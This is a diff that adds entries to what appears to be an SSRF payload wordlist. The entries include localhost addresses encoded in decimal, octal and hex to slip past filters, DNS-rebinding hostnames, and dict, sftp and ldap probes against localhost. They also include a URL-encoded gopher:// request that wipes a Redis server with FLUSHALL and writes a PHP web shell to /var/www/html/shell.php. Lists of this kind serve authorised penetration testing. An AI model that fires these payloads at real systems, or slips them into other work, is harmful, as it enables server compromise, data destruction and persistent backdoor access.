@@ -1114,3 +1114,20 @@ http://rebind.attacker.tld/
 ?out={payload}
 ?view={payload}
 ?dir={payload}
+# ─── IP-encoding bypass ladder (skraft9/vulnerability-research) ───
+http://2130706433/                            # 127.0.0.1 as decimal
+http://0177.0000.0000.0001/                   # 127.0.0.1 as octal
+http://0x7f000001/                            # 127.0.0.1 as hex
+http://0x7f.0x00.0x00.0x01/                   # 127.0.0.1 dotted-hex
+http://127.1/                                 # shorthand
+http://127.0.1/                               # shorthand
+http://0/                                     # implicit localhost on some parsers
+# ─── DNS rebinding via rbndr.us (TOCTOU) ───
+http://7f000001.80808080.rbndr.us/            # alternates 127.0.0.1 ↔ 8.8.8.8 each lookup
+http://<hex_ip1>.<hex_ip2>.rbndr.us/          # template
+# ─── Redis RCE via gopher:// ───
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+# ─── protocol wrappers ───
+dict://127.0.0.1:11211/stat
+sftp://127.0.0.1:22/
+ldap://127.0.0.1:389/%0aOP+%3D+dc%3Dexample%2Cdc%3Dcom
